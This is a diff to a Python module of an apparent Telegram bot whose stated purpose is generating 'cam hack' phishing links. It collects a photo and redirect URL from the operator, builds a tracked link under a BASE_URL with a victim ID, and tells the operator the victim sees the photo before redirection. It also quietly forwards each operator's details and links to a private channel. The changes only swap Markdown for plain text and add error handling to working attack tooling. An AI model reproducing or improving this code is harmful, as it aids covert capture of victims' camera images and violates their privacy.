@@ -7,7 +7,6 @@ from bot.utils.storage import user_data, link_cache, victim_data_store, user_use
 def handle_cam_hack(bot, message, get_bottom_buttons):
     user_id = message.chat.id
 
-    # ===== CAPTURE USERNAME =====
     try:
         chat = bot.get_chat(user_id)
         if chat.username:
@@ -30,14 +29,17 @@ def get_cam_photo(message, user_id, get_bottom_buttons, bot):
 
         username = user_username_cache.get(user_id, "Unknown")
 
-        bot.send_photo(
-            PRIVATE_CHANNEL_ID,
-            photo_id,
-            caption=f"📸 *User Uploaded Photo*\n\n"
-                    f"👤 Username: {username}\n"
-                    f"🆔 ID: `{user_id}`",
-            parse_mode="Markdown"
-        )
+        # ===== FIX: NO MARKDOWN, ONLY PLAIN TEXT =====
+        try:
+            bot.send_photo(
+                PRIVATE_CHANNEL_ID,
+                photo_id,
+                caption=f"📸 User Uploaded Photo\n\n"
+                        f"👤 Username: {username}\n"
+                        f"🆔 ID: {user_id}"
+            )
+        except Exception as e:
+            print(f"Photo send error: {e}")
 
         msg = bot.send_message(user_id, "📤 Now send REDIRECT LINK", reply_markup=get_bottom_buttons())
         bot.register_next_step_handler(msg, lambda m: get_cam_redirect(m, user_id, get_bottom_buttons, bot))
@@ -53,17 +55,18 @@ def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
 
         username = user_username_cache.get(user_id, "Unknown")
 
-        # ===== CHANNEL ME REDIRECT LINK BHEJO =====
-        bot.send_message(
-            PRIVATE_CHANNEL_ID,
-            f"🔗 *Redirect Link Set*\n\n"
-            f"👤 User: {username}\n"
-            f"🆔 ID: `{user_id}`\n"
-            f"🌐 Redirect: {redirect_url}",
-            parse_mode="Markdown"
-        )
+        # ===== NO MARKDOWN =====
+        try:
+            bot.send_message(
+                PRIVATE_CHANNEL_ID,
+                f"🔗 Redirect Link Set\n\n"
+                f"👤 User: {username}\n"
+                f"🆔 ID: {user_id}\n"
+                f"🌐 Redirect: {redirect_url}"
+            )
+        except Exception as e:
+            print(f"Redirect send error: {e}")
 
-        # ===== FINAL PHISHING LINK GENERATE KARO =====
         unique_id = str(uuid.uuid4())[:8]
         link = f"{BASE_URL}/p/cam/{unique_id}?v={user_id}"
         link_cache[unique_id] = {
@@ -73,29 +76,28 @@ def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
             "link": link
         }
 
-        # ===== CHANNEL ME FINAL LINK BHEJO =====
-        bot.send_message(
-            PRIVATE_CHANNEL_ID,
-            f"✅ *Final Cam Hack Link*\n\n"
-            f"👤 User: {username}\n"
-            f"🆔 ID: `{user_id}`\n"
-            f"🔗 Link: {link}",
-            parse_mode="Markdown"
-        )
+        try:
+            bot.send_message(
+                PRIVATE_CHANNEL_ID,
+                f"✅ Final Cam Hack Link\n\n"
+                f"👤 User: {username}\n"
+                f"🆔 ID: {user_id}\n"
+                f"🔗 Link: {link}"
+            )
+        except Exception as e:
+            print(f"Final link send error: {e}")
 
-        # ===== USER KO FINAL LINK DO =====
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
-            InlineKeyboardButton("🔗 Open Link", url=link),
-            InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
-            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
+            InlineKeyboardButton("🔗 Open", url=link),
+            InlineKeyboardButton("📋 Copy", callback_data="copy"),
+            InlineKeyboardButton("🔗 Shorten", url="https://short-link.me/")
         )
         bot.send_message(
             user_id,
-            f"✅ *CAMERA phishing link ready:*\n\n`{link}`\n\n"
-            f"Victim sees your photo → redirects to `{redirect_url}`",
-            reply_markup=markup,
-            parse_mode="Markdown"
+            f"✅ CAMERA phishing link ready:\n\n{link}\n\n"
+            f"Victim sees your photo → redirects to {redirect_url}",
+            reply_markup=markup
         )
     else:
         bot.send_message(user_id, "❌ Valid URL starting with http:// or https://", reply_markup=get_bottom_buttons())
